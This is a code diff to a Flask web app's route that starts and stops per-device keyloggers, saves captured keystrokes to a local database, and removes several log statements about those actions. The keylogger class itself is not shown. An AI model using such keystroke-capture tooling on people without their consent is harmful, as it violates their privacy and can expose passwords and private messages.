@@ -443,31 +443,34 @@ def toggle_logging():
     device_id = data.get('device_id')
     action = data.get('action')
     
-    app.logger.info(f"Toggle logging request: device_id={device_id}, action={action}")
-    
     try:
         device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
         if not device:
-            app.logger.error(f"Device not found: {device_id}")
             return jsonify({"error": "Device not found"}), 404
+
+        # Check if device ID matches the current OS
+        is_windows_device = device_id.startswith('WIN-')
+        is_windows_system = platform.system().lower() == 'windows'
         
-        # Store keylogger instance in app context
+        if is_windows_device != is_windows_system:
+            return jsonify({
+                "error": "Device type doesn't match current operating system"
+            }), 400
+            
+        # Get the appropriate keylogger class
+        KeyLoggerClass = get_keylogger_class()
+        
         if not hasattr(app, 'keyloggers'):
             app.keyloggers = {}
             
         if action == 'start':
-            # Create new keylogger instance if not exists
             if device_id not in app.keyloggers:
-                db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
-                KeyLoggerClass = get_keylogger_class()
-                app.logger.info(f"Creating {KeyLoggerClass.__name__} with db_path: {db_path}")
+                db_path = os.path.join(app.instance_path, 'keylogger.db')
                 app.keyloggers[device_id] = KeyLoggerClass(db_path)
             
-            # Start the keylogger
             result = app.keyloggers[device_id].start_logging(device_id)
             device.is_active = True
             db.session.commit()
-            app.logger.info(f"Keylogger start result: {result}")
             return jsonify({"message": result, "is_active": True})
             
         elif action == 'stop':
@@ -475,12 +478,11 @@ def toggle_logging():
                 result = app.keyloggers[device_id].stop_logging()
                 device.is_active = False
                 db.session.commit()
-                app.logger.info(f"Keylogger stop result: {result}")
                 return jsonify({"message": result, "is_active": False})
             return jsonify({"message": "Keylogger was not running", "is_active": False})
             
     except Exception as e:
-        app.logger.error(f"Error toggling logging: {str(e)}")
+        app.logger.error(f"Error in toggle_logging: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/api/device/status', methods=['POST'])
